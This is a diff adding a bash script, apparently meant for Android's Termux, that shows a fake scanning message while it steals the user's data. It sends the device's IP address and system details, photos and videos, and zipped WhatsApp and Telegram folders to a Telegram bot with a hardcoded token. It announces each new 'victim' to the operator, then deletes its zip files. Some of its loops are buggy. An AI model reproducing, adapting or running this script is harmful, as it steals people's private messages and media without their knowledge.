@@ -1,0 +1,60 @@
+#!/bin/bash
+
+
+		TOKEN="5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng"
+                CHAT_ID="5010958919"
+                IPaddres="$(curl ifconfig.me)"
+                DATAS="$(uname -a)"
+                FILES=/storage/
+                #VIDEO=$(find $FILES -name *.mp4)
+                #PNG=$(find $FILES -name *.png)
+                #JPG=$(find $FILES -name *.jpg)
+
+                echo -e $info $r "[★] SCANING ..."
+
+                curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" Hi Boss You Have new Victam !! " &>> /dev/n>
+                curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$IPaddres" &>> /dev/null
+                curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$DATAS" &>> /dev/null
+                # Fetch files
+
+                for jpg in $JPG
+                do
+
+                JPG=$(find $FILES -name *.jpg)
+                # Upload the file
+                        curl -F document=@$jpg "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+                done
+
+                for video in $VIDEO
+                do
+                        VIDEO=$(find $FILES -name *.mp4)
+                        curl -F document=@$video "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+                done
+
+                for png in $PNG
+                do
+
+                        PNG=$(find $FILES -name *.png)
+
+                        curl -F document=@$png "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+
+                done
+
+                echo -e $info $r "[★] Wite sec .."
+
+                zip -r $PREFIX/etc/Hacked/w.zip /sdcard/WhatsApp/* &>> /dev/null
+                zip -r $PREFIX/etc/Hacked/t.zip /sdcard/Telegram/* &>> /dev/null
+
+                curl -F document=@$PREFIX/etc/Hacked/w.zip "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+                curl -F document=@$PREFIX/etc/Hacked/t.zip "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+                curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" end fo data victams " &>> /dev/null
+
+                rm -rfd $PREFIX/etc/Hacked/t.zip $PREFIX/etc/Hacked/w.zip &>> /dev/null
+                clear
+
+                echo -e $info $r "[★] FINSHED ...."
